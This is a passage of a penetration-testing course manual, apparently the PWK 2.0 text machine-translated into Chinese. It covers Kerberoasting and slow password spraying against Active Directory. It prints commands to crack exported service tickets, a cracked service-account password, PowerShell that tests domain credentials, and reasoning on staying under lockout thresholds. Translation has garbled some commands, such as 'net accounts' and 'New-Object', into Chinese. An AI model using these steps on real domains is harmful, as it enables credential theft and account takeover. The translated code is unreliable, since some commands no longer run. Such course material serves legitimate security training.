<div style="position:absolute;top:41382;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 保存到文件：0-40e10000-Offsec@krbtgt~CORP.COM-CORP.COM.kirbi</font></font></nobr></div>
<div style="position:absolute;top:41416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[00000001] - 0x00000017 - rc4_hmac_nt</font></font></nobr></div>
<div style="position:absolute;top:41432;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始/结束/MaxRenew: 12/02/2018 10.18.31 ; </font><font style="vertical-align: inherit;">12/02/2018 20.17.53 ; </font><font style="vertical-align: inherit;">19/02/2018 10.17.53</font></font></nobr></div>
<div style="position:absolute;top:41449;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器名称：HTTP/CorpWebServer.corp.com @ CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:41466;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户名称：Offsec@CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:41484;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志 40a50000 : name_canonicalize ; </font><font style="vertical-align: inherit;">ok_as_delegate ; </font><font style="vertical-align: inherit;">预认证；</font><font style="vertical-align: inherit;">可再生 ;</font></font></nobr></div>
<div style="position:absolute;top:41500;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 保存到文件：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi</font></font></font></b></nobr></div>
<div style="position:absolute;top:41520;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 693 - 从内存中导出票证</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:41613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">660 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://msdn.microsoft.com/en-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:41628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:41755;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="36"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 36 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:41788;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:42865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:42865;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:42865;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">653</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据 Kerberos 协议，服务票证使用 SPN 的密码哈希加密。</font></font></nobr></div>
<div style="position:absolute;top:41903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们能够请求票证并使用蛮力或猜测（以一种技术</font></font></nobr></div>
<div style="position:absolute;top:41922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kerberoasting </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">661</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），我们将知道密码哈希，从中我们可以破解清楚</font></font></nobr></div>
<div style="position:absolute;top:41942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务帐户的文本密码。</font><font style="vertical-align: inherit;">作为额外的奖励，我们也</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要管理权限</font></font></nobr></div>
<div style="position:absolute;top:41961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于这次攻击。</font></font></nobr></div>
<div style="position:absolute;top:41994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们试试这个。</font><font style="vertical-align: inherit;">要执行词表攻击，我们必须首先</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">apt</font></font></b><font style="vertical-align: inherit;">安装</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberoast</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:42013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tgsrepcrack.py</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，提供一个词表和下载的服务票：</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42075;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，服务票据文件是二进制文件。</font><font style="vertical-align: inherit;">转移时请记住这一点</font></font></i></nobr></div>
<div style="position:absolute;top:42095;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用像 Netcat 这样的工具，可能会在传输过程中损坏它。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:42159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt update &amp;&amp; sudo apt install kerberoast</font></font></font></b></nobr></div>
<div style="position:absolute;top:42176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:42193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offse</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42210;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:42227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到票 0 的密码：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Qwerty09！</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件：1-40a50000-Offsec@HTTP~CorpWebServer.cor</font></font></nobr></div>
<div style="position:absolute;top:42244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p.com-CORP.COM.kirbi</font></font></nobr></div>
<div style="position:absolute;top:42261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票都破了！</font></font></nobr></div>
<div style="position:absolute;top:42280;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 694 - 破解票据</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们成功破解了服务票据，并获得了明文密码</font></font></nobr></div>
<div style="position:absolute;top:42329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务帐户。</font></font></nobr></div>
<div style="position:absolute;top:42362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果域包含具有以下权限的高特权服务帐户，则此技术可能非常强大</font></font></nobr></div>
<div style="position:absolute;top:42381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">弱密码，这在许多组织中并不少见。</font><font style="vertical-align: inherit;">但是，如果管理或分组</font></font></nobr></div>
<div style="position:absolute;top:42400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定 SPN 使用托管服务帐户，密码将随机</font></font></nobr></div>
<div style="position:absolute;top:42420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成，复杂，120 个字符长，使破解不可行。</font></font></nobr></div>
<div style="position:absolute;top:42453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管此示例依赖于 kerberoast tgsrepcrack.py 脚本，但我们也可以使用 John</font></font></nobr></div>
<div style="position:absolute;top:42472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ripper </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">662</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 Hashcat </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">663</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来利用这些工具的特性和速度。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42534;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoke-Kerberoast.ps1 </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">664</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本扩展了这种攻击，并且可以自动</font></font></i></nobr></div>
<div style="position:absolute;top:42553;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举域中的所有服务主体名称，请求服务票证</font></font></i></nobr></div>
<div style="position:absolute;top:42572;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并将它们导出为准备在开膛手约翰和</font></font></i></nobr></div>
<div style="position:absolute;top:42592;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hashcat，在这次攻击中完全不需要Mimikatz。</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:42727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">661 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（蒂姆梅丁，2015 年），https://github.com/nidem/kerberoast</font></font></font></nobr></div>
<div style="position:absolute;top:42747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">662 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（迈克尔克莱默，2015），</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:42762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://github.com/magnumripper/JohnTheRipper/commit/05e514646dfe5aa65ee48774571c0169f7e25a53</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:42781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">663 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（@FirstOurs，2016），https://github.com/hashcat/hashcat/pull/225</font></font></font></nobr></div>
<div style="position:absolute;top:42801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">664 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Will Schroeder，2016 年），https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:42816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kerberoast.ps1 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:42943;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="37"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 37 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:42976;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:44053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:44053;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:44053;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">654</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:43072;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 重复请求服务票据、导出服务票据、破解服务票据的手工操作</font></font></nobr></div>
<div style="position:absolute;top:43121;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 tgsrepcrack.py Python 脚本。</font></font></nobr></div>
<div style="position:absolute;top:43150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 对域中的任何其他 SPN 执行相同的操作。</font></font></nobr></div>
<div style="position:absolute;top:43178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用开膛手约翰破解同一张服务票。</font></font></nobr></div>
<div style="position:absolute;top:43206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 使用 Invoke-Kerberoast.ps1 脚本重复这些练习。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:43241;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.5</font></font></i></nobr></div>
<div style="position:absolute;top:43241;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">低速密码猜测</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上一节中，我们研究了服务帐户如何通过滥用</font></font></nobr></div>
<div style="position:absolute;top:43298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kerberos 协议的功能，但 Active Directory 也可以为我们提供以下信息：</font></font></nobr></div>
<div style="position:absolute;top:43317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能会导致针对用户帐户的更高级的密码猜测技术。</font></font></nobr></div>
<div style="position:absolute;top:43350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在进行蛮力或词表认证攻击时，我们必须注意帐户</font></font></nobr></div>
<div style="position:absolute;top:43370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锁定，因为太多失败的登录可能会阻止帐户进行进一步的攻击并可能发出警报</font></font></nobr></div>
<div style="position:absolute;top:43389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统管理员。</font></font></nobr></div>
<div style="position:absolute;top:43422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将使用 LDAP 和 ADSI 对 AD 进行“低速”密码攻击</font></font></nobr></div>
<div style="position:absolute;top:43441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户而不会触发帐户锁定。</font></font></nobr></div>
<div style="position:absolute;top:43474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们看看域的帐户策略与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net accounts</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\Offsec.corp&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络账户</font></font></font></b></nobr></div>
<div style="position:absolute;top:43526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">强制用户注销多长时间后？：从不</font></font></nobr></div>
<div style="position:absolute;top:43543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码最短使用期限（天）：    </font></font></nobr></div>
<div style="position:absolute;top:43543;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0</font></font></nobr></div>
<div style="position:absolute;top:43560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最长密码期限（天）：    </font></font></nobr></div>
<div style="position:absolute;top:43560;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42</font></font></nobr></div>
<div style="position:absolute;top:43577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最小密码长度：    </font></font></nobr></div>
<div style="position:absolute;top:43577;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0</font></font></nobr></div>
<div style="position:absolute;top:43594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">维护的密码历史长度：    </font></font></nobr></div>
<div style="position:absolute;top:43594;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有任何</font></font></nobr></div>
<div style="position:absolute;top:43610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锁定阈值：    </font></font></nobr></div>
<div style="position:absolute;top:43610;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5</font></font></nobr></div>
<div style="position:absolute;top:43628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锁定时间（分钟）：    </font></font></nobr></div>
<div style="position:absolute;top:43628;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30</font></font></nobr></div>
<div style="position:absolute;top:43645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锁定观察窗口（分钟）：    </font></font></nobr></div>
<div style="position:absolute;top:43645;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30</font></font></nobr></div>
<div style="position:absolute;top:43662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电脑角色：    </font></font></nobr></div>
<div style="position:absolute;top:43662;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作站</font></font></nobr></div>
<div style="position:absolute;top:43678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:43698;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 695 - net accounts 命令的结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这里有很多很棒的信息，但让我们首先关注“锁定阈值”，它表明</font></font></nobr></div>
<div style="position:absolute;top:43746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锁定前五次登录尝试的限制。</font><font style="vertical-align: inherit;">这意味着我们可以安全地尝试四次登录</font></font></nobr></div>
<div style="position:absolute;top:43766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不会触发锁定。</font><font style="vertical-align: inherit;">这听起来并不多，但请考虑</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锁定观察</font></font></i></nobr></div>
<div style="position:absolute;top:43785;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">window</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它表示在最后一次登录尝试后每三十分钟，我们会得到一个</font></font></nobr></div>
<div style="position:absolute;top:43805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外的“免费”登录尝试。</font></font></nobr></div>
<div style="position:absolute;top:43838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用这些设置，我们可以在 24 小时内针对每个用户尝试 52 次登录。</font></font></nobr></div>
<div style="position:absolute;top:43857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域用户不会触发锁定，假设实际用户没有失败登录尝试。</font></font></nobr></div>
<div style="position:absolute;top:43889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">像这样的攻击将允许我们编译一个非常常用的密码的简短列表和</font></font></nobr></div>
<div style="position:absolute;top:43909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对大量用户使用它，这在实践中暴露了相当多的弱账户</font></font></nobr></div>
<div style="position:absolute;top:43928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织中的密码。</font></font></nobr></div>
<div style="position:absolute;top:43961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知道了这一点，让我们实施这种攻击。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:44131;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="38"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 38 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:44164;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:45241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:45241;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:45241;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">655</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有多种方法可以测试 AD 用户登录，但我们可以使用 PowerShell 脚本来测试</font></font></nobr></div>
<div style="position:absolute;top:44279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">演示基本组件。</font><font style="vertical-align: inherit;">在前面的部分中，我们对</font></font></nobr></div>
<div style="position:absolute;top:44298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器作为登录用户。</font><font style="vertical-align: inherit;">但是，我们也可以在上下文中进行查询</font></font></nobr></div>
<div style="position:absolute;top:44318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不同的用户通过设置</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirectoryEntry</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实例。</font></font></nobr></div>
<div style="position:absolute;top:44351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在前面的示例中，我们使用了</font><font style="vertical-align: inherit;">不带参数</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirectoryEntry</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构造函数，但是我们可以</font></font></nobr></div>
<div style="position:absolute;top:44370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供三个参数，包括域控制器的 LDAP 路径以及用户名</font></font></nobr></div>
<div style="position:absolute;top:44389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和密码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</font></font></nobr></div>
<div style="position:absolute;top:44458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PDC = ($domainObj.PdcRoleOwner).Name</font></font></nobr></div>
<div style="position:absolute;top:44492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString = "LDAP://"</font></font></nobr></div>
<div style="position:absolute;top:44509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $PDC + "/"</font></font></nobr></div>
<div style="position:absolute;top:44543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"</font></font></nobr></div>
<div style="position:absolute;top:44577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $DistinguishedName</font></font></nobr></div>
<div style="position:absolute;top:44611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新对象 System.DirectoryServices。</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirectoryEntry($SearchString, "jeff_admin", "Qwert</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:44628;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">y09！”）</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44647;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 696 - 使用 DirectoryEntry 进行身份验证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果用户账户的密码正确，对象创建将成功，如图</font></font></nobr></div>
<div style="position:absolute;top:44696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 697。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尊贵名称：{DC=corp,DC=com}</font></font></nobr></div>
<div style="position:absolute;top:44748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小路    </font></font></nobr></div>
<div style="position:absolute;top:44748;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: LDAP://DC01.corp.com/DC=corp,DC=com</font></font></nobr></div>
<div style="position:absolute;top:44767;left:289"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 697 - 通过 DirectoryEntry 成功验证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果密码无效，则不会创建任何对象，我们将收到异常，如下所示</font></font></nobr></div>
<div style="position:absolute;top:44816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 698. 请注意用户名或密码不正确的明确警告。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">format-default ：检索成员“distinguish”时发生以下异常</font></font></nobr></div>
<div style="position:absolute;top:44868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">edName": </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"用户名或密码不正确。</font></font></font></b></nobr></div>
<div style="position:absolute;top:44884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">”</font></font></nobr></div>
